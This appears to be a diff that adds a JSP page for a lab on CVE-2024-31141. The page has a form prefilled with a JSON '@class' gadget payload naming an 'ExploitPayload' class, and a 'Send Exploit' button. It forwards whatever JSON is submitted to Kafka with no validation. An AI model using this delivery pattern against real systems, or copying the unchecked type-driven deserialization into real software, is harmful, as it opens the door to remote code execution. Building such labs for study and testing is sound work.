@@ -1,0 +1,22 @@
+<%@ page import="com.example.kafkademo.KafkaProducerWeb" %>
+<html>
+<head><title>CVE-2024-31141 Lab</title></head>
+<body>
+<h2>Send JSON Payload to Kafka</h2>
+<form method="post">
+  <textarea name="json" rows="10" cols="80">
+{
+  "@class": "com.example.kafkademo.ExploitPayload"
+}
+  </textarea><br/>
+  <input type="submit" value="Send Exploit"/>
+</form>
+<%
+    String json = request.getParameter("json");
+    if (json != null && !json.trim().isEmpty()) {
+        KafkaProducerWeb.send(json);
+        out.println("<p>Payload sent!</p>");
+    }
+%>
+</body>
+</html>
